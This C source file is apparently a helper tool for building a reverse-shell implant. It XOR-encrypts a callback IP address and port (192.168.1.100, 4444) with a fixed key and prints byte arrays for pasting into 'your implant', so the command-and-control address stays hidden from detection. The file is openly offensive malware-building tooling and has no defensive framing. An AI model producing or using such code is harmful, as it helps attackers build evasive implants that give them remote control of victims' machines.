#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Your key (must match implant side)
static const unsigned char KEY[32] = {
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X',
    'X','X','X','X','X','X','X','X','X','X','X','X','X','X','X','X'
};

void xor_encrypt(const unsigned char* in, int in_len, unsigned char* out, const unsigned char* key, int key_len) {
    for (int i = 0; i < in_len; ++i) {
        out[i] = in[i] ^ key[i % key_len];
    }
}

int main() {
    // Change these as needed
    const char* HOST = "192.168.1.100";   // same as your shell's host
    const char* PORT = "4444";             // same as your shell's port

    unsigned char enc_host[64] = {0};
    unsigned char enc_port[16] = {0};

    int h_len = strlen(HOST);
    int p_len = strlen(PORT);

    // Encrypt host
    xor_encrypt((const unsigned char*)HOST, h_len, enc_host, KEY, 32);

    // Encrypt port
    xor_encrypt((const unsigned char*)PORT, p_len, enc_port, KEY, 32);

    // Print to stdout (copy into your implant)
    printf("// ENCRYPTED_HOST\nstatic const unsigned char ENCRYPTED_HOST[] = {\n");
    for (int i = 0; i < h_len; ++i) {
        printf("0x%02x, ", enc_host[i]);
    }
    printf("\n};\n\n");

    printf("// ENCRYPTED_PORT\nstatic const unsigned char ENCRYPTED_PORT[] = {\n");
    for (int i = 0; i < p_len; ++i) {
        printf("0x%02x, ", enc_port[i]);
    }
    printf("\n};\n");

    return 0;
}
